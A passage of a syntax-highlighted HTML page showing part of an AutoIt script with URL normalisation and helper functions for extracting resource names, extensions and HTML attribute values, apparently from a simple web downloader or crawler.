</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">)=</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$sURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">,</span><span class="sc4">chr</span><span class="sc8">(</span><span class="sc3">13</span><span class="sc8">),</span><span class="sc7">""</span><span class="sc8">),</span><span class="sc4">chr</span><span class="sc8">(</span><span class="sc3">10</span><span class="sc8">),</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$sURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringReplace</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">,</span><span class="sc7">"&amp;amp;"</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$sURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringReplace</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">,</span><span class="sc7">"\"</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$UrlPart</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringsplit</span><span class="sc8">(</span><span class="sc9">$sURL</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$i</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]-</span><span class="sc3">1</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">])&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"."</span><span class="sc0"> </span><span class="sc5">Or</span><span class="sc0"> </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">".."</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
  </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc5">Else</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">+</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">".."</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
   </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
   </span><span class="sc9">$UrlPart</span><span class="sc8">[</span><span class="sc9">$i</span><span class="sc8">+</span><span class="sc3">1</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
  </span><span class="sc5">EndIf</span><span class="sc0">
 </span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">Next</span><span class="sc0">
</span><span class="sc9">$sNewURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> join</span><span class="sc8">(</span><span class="sc9">$UrlPart</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">While</span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">"//"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$sNewURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">"//"</span><span class="sc8">,</span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">WEnd</span><span class="sc0">
</span><span class="sc9">$sNewURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">":/"</span><span class="sc8">,</span><span class="sc7">"://"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">Stringleft</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"/"</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> 
    </span><span class="sc9">$sNewURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">If</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">"#"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">And</span><span class="sc0"> LastIndexOf</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">"&amp;"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">)&lt;</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">"#"</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc9">$sNewURL</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">StringLeft</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc4">StringInStr</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">,</span><span class="sc7">"#"</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$sNewURL</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> GetResourceName</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">)</span><span class="sc1">;returns the name of the resource from the given url</span><span class="sc0">
</span><span class="sc9">$sPath</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringreplace</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"\"</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"/"</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> LastIndexOf</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"/"</span><span class="sc8">,</span><span class="sc0"> false</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$ResourceName</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
 </span><span class="sc9">$ResourceName</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$sPath</span><span class="sc0">
</span><span class="sc5">else</span><span class="sc0">
 </span><span class="sc9">$ResourceName</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringright</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">)-</span><span class="sc9">$ndx</span><span class="sc8">-</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$ResourceName</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc9">$ResourceName</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">"index"</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$ResourceName</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> GetResourceExtension</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">)</span><span class="sc1">;returns the resource's extension</span><span class="sc0">
</span><span class="sc9">$ResName</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> GetResourceName</span><span class="sc8">(</span><span class="sc9">$sPath</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> LastIndexof</span><span class="sc8">(</span><span class="sc9">$ResName</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc7">"."</span><span class="sc8">,</span><span class="sc0"> false</span><span class="sc8">)+</span><span class="sc3">2</span><span class="sc0">
</span><span class="sc9">$Ext</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> 
 </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$Ext</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">Endif</span><span class="sc0">
</span><span class="sc9">$Ext</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringmid</span><span class="sc8">(</span><span class="sc9">$ResName</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc4">stringinstr</span><span class="sc8">(</span><span class="sc9">$ext</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">)&gt;</span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc9">$ext</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringleft</span><span class="sc8">(</span><span class="sc9">$ext</span><span class="sc8">,</span><span class="sc0">indexof</span><span class="sc8">(</span><span class="sc9">$ext</span><span class="sc8">,</span><span class="sc7">"?"</span><span class="sc8">,</span><span class="sc0">false</span><span class="sc8">))</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$Ext</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> GetOption</span><span class="sc8">(</span><span class="sc9">$opt</span><span class="sc8">,</span><span class="sc9">$HTMLline</span><span class="sc8">)</span><span class="sc1">;returns the value of the specified HTML parameter</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$Link</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
</span><span class="sc9">$opt</span><span class="sc8">=</span><span class="sc9">$opt</span><span class="sc8">&amp;</span><span class="sc7">"="</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> IndexOf</span><span class="sc8">(</span><span class="sc9">$HTMLline</span><span class="sc8">,</span><span class="sc0"> </span><span class="sc9">$opt</span><span class="sc8">,</span><span class="sc0"> false</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc8">-</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc8">+</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$opt</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">+</span><span class="sc0"> </span><span class="sc3">2</span><span class="sc0">
</span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$end_char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">stringmid</span><span class="sc8">(</span><span class="sc9">$HTMLLine</span><span class="sc8">,</span><span class="sc9">$ndx</span><span class="sc8">-</span><span class="sc3">1</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc9">$end_char</span><span class="sc8">&lt;&gt;</span><span class="sc7">"'"</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0"> </span><span class="sc9">$end_char</span><span class="sc8">&lt;&gt;</span><span class="sc7">""""</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0">
    </span><span class="sc9">$end_char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">" "</span><span class="sc0">
</span><span class="sc5">EndIf</span><span class="sc0">
</span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$i</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$ndx</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc4">Stringlen</span><span class="sc8">(</span><span class="sc9">$HTMLline</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc7">""</span><span class="sc0">
 </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc4">Stringmid</span><span class="sc8">(</span><span class="sc9">$HTMLline</span><span class="sc8">,</span><span class="sc9">$i</span><span class="sc8">,</span><span class="sc3">1</span><span class="sc8">)</span><span class="sc0">
 </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc8">(</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0"> </span><span class="sc8">&lt;&gt;</span><span class="sc0"> </span><span class="sc9">$end_char</span><span class="sc0"> </span><span class="sc8">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
  </span><span class="sc9">$Link</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$Link</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$char</span><span class="sc0">
 </span><span class="sc5">else</span><span class="sc0">
  </span><span class="sc5">ExitLoop</span><span class="sc0">
 </span><span class="sc5">endif</span><span class="sc0">
</span><span class="sc5">Next</span><span class="sc0">
</span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc9">$Link</span><span class="sc8">)</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">Func</span><span class="sc0"> join</span><span class="sc8">(</span><span class="sc9">$array</span><span class="sc8">,</span><span class="sc9">$join_char</span><span class="sc8">)</span><span class="sc1">;split function^(-1)</span><span class="sc0">
    </span><span class="sc5">If</span><span class="sc0"> </span><span class="sc4">UBound</span><span class="sc8">(</span><span class="sc9">$array</span><span class="sc8">)</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc3">0</span><span class="sc0"> </span><span class="sc5">Then</span><span class="sc0"> </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc7">""</span><span class="sc8">)</span><span class="sc0">
    </span><span class="sc5">Dim</span><span class="sc0"> </span><span class="sc9">$res</span><span class="sc0">
    </span><span class="sc5">For</span><span class="sc0"> </span><span class="sc9">$e</span><span class="sc8">=</span><span class="sc3">1</span><span class="sc0"> </span><span class="sc5">To</span><span class="sc0"> </span><span class="sc9">$array</span><span class="sc8">[</span><span class="sc3">0</span><span class="sc8">]</span><span class="sc0">
        </span><span class="sc9">$res</span><span class="sc0"> </span><span class="sc8">=</span><span class="sc0"> </span><span class="sc9">$res</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$array</span><span class="sc8">[</span><span class="sc9">$e</span><span class="sc8">]</span><span class="sc0"> </span><span class="sc8">&amp;</span><span class="sc0"> </span><span class="sc9">$join_char</span><span class="sc0">
    </span><span class="sc5">Next</span><span class="sc0">
    </span><span class="sc5">Return</span><span class="sc8">(</span><span class="sc4">StringLeft</span><span class="sc8">(</span><span class="sc9">$res</span><span class="sc8">,</span><span class="sc4">StringLen</span><span class="sc8">(</span><span class="sc9">$res</span><span class="sc8">)-</span><span class="sc3">1</span><span class="sc8">))</span><span class="sc0">
</span><span class="sc5">EndFunc</span><span class="sc0">

</span><span class="sc5">func</span><span class="sc0"> onautoitexit</span><span class="sc8">()</span><span class="sc1">;on exit,</span><span class="sc0">
    TCPShutdown</span><span class="sc8">()</span><span class="sc0">
</span><span class="sc5">EndFunc</span></div></body>
</html>
